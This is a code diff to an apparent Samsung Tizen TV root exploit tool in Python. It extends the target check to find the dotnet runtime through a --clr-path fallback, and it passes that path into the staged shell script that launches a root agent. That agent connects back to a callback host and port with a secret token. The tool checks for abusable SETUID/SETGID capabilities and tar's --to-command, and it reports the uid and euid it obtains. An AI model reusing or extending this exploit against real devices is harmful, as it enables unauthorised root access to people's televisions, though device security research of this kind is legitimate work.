@@ -8,6 +8,7 @@ import ipaddress
 import json
 import re
 import secrets
+import shlex
 import subprocess
 import tarfile
 import tempfile
@@ -41,6 +42,54 @@ class TargetAssessment:
     capabilities: str
     original_hashes: str
     runtime: str
+    clr_path: str | None = None
+
+
+def _discover_runtime(client: SdbClient) -> tuple[str, str | None]:
+    result = client.capture("/usr/bin/dotnet --list-runtimes")
+    if "[exit:0]" in result.output:
+        runtimes = result.output.split("\n[exit:0]", 1)[0]
+        versions = [
+            tuple(int(part) for part in match.groups())
+            for line in runtimes.splitlines()
+            if (match := re.match(
+                r"Microsoft\.NETCore\.App (\d+)\.(\d+)\.(\d+)\s+\[", line
+            ))
+        ]
+        clr_path = None
+    elif (
+        "Unknown option --list-runtimes" in result.output
+        and "--clr-path" in result.output
+    ):
+        # Samsung's Tizen host is not the desktop SDK CLI. It loads a CLR
+        # directory explicitly rather than exposing --list-runtimes.
+        paths = _capture(
+            client,
+            "for p in /usr/share/dotnet/shared/Microsoft.NETCore.App/*; do "
+            'if test -f "$p/libcoreclr.so" && '
+            'test -f "$p/System.Private.CoreLib.dll"; then echo "$p"; fi; done',
+        )
+        candidates = {
+            tuple(int(part) for part in match.groups()): line
+            for line in paths.splitlines()
+            if (match := re.fullmatch(
+                r"/usr/share/dotnet/shared/Microsoft\.NETCore\.App/"
+                r"(\d+)\.(\d+)\.(\d+)", line
+            ))
+        }
+        versions = list(candidates)
+        supported = [v for v in versions if v[0] >= 6 or v[:2] == (3, 1)]
+        clr_path = candidates[max(supported)] if supported else None
+    else:
+        raise ArchiveRootError(
+            "SDK command failed: /usr/bin/dotnet --list-runtimes: "
+            + result.output.strip()
+        )
+    if any(version[0] >= 6 for version in versions):
+        return "6.0", clr_path
+    if any(version[:2] == (3, 1) for version in versions):
+        return "3.1", clr_path
+    raise ArchiveRootError("no supported Microsoft.NETCore.App runtime (3.1 or 6+)")
 
 
 def _capture(client: SdbClient, command: str, timeout: float = 15.0) -> str:
@@ -84,26 +133,12 @@ def _check_target(client: SdbClient) -> TargetAssessment:
         raise ArchiveRootError(
             "sdbd-tarlauncher lacks effective SETUID/SETGID capabilities"
         )
-    runtimes = _capture(client, "/usr/bin/dotnet --list-runtimes")
-    majors = {
-        int(match.group(1))
-        for line in runtimes.splitlines()
-        if (match := re.match(r"Microsoft\.NETCore\.App (\d+)\.\d+\.\d+\s+\[", line))
-    }
-    if any(major >= 6 for major in majors):
-        runtime = "6.0"
-    elif 3 in majors and any(
-        re.match(r"Microsoft\.NETCore\.App 3\.1\.\d+\s+\[", line)
-        for line in runtimes.splitlines()
-    ):
-        runtime = "3.1"
-    else:
-        raise ArchiveRootError("no supported Microsoft.NETCore.App runtime (3.1 or 6+)")
+    runtime, clr_path = _discover_runtime(client)
     tar_options = _capture(client, "/usr/bin/tar --help | grep -- --to-command")
     if "--to-command" not in tar_options:
         raise ArchiveRootError("TV tar does not support --to-command")
     return TargetAssessment(
-        capabilities, _capture(client, SYSTEM_HASH_COMMAND), runtime
+        capabilities, _capture(client, SYSTEM_HASH_COMMAND), runtime, clr_path
     )
 
 
@@ -124,6 +159,7 @@ def _prepare_artifacts(
     callback_host: str,
     callback_port: int,
     secret: bytes,
+    clr_path: str | None = None,
 ) -> None:
     staging = STAGING_ROOT / package
     private_key = directory / "private.pem"
@@ -159,9 +195,10 @@ def _prepare_artifacts(
             json.dumps(runtime_config) + "\n", encoding="ascii"
         )
     write_secret(directory / "root-agent.token", secret)
+    clr_option = f"--clr-path {shlex.quote(clr_path)} " if clr_path else ""
     script = (
         "#!/bin/sh\n"
-        f"exec /usr/bin/dotnet {staging}/SamsungTvRootAgent.dll "
+        f"exec /usr/bin/dotnet {clr_option}{staging}/SamsungTvRootAgent.dll "
         f"{callback_host} {callback_port} {staging}/root-agent.token {staging}\n"
     ).encode("ascii")
     with tarfile.open(archive, "w:gz") as output:
@@ -264,11 +301,17 @@ async def probe(
                 callback,
                 server.listening_port,
                 server.secret,
+                assessment.clr_path,
             )
             staging_started = True
             await asyncio.to_thread(_stage, client, directory, payloads, package)
+            clr_option = (
+                f"--clr-path {shlex.quote(assessment.clr_path)} "
+                if assessment.clr_path else ""
+            )
             command = (
-                f"/usr/bin/dotnet {STAGING_ROOT / package}/SamsungTvArchiveRoot.dll "
+                f"/usr/bin/dotnet {clr_option}"
+                f"{STAGING_ROOT / package}/SamsungTvArchiveRoot.dll "
                 f"{package}"
             )
             launch_task = asyncio.create_task(
@@ -305,6 +348,7 @@ async def probe(
                     "model": model,
                     "host": tv_host,
                     "runtime": assessment.runtime,
+                    "clr_path": assessment.clr_path,
                     "authenticated": True,
                     "uid": identity.uid,
                     "euid": identity.euid,
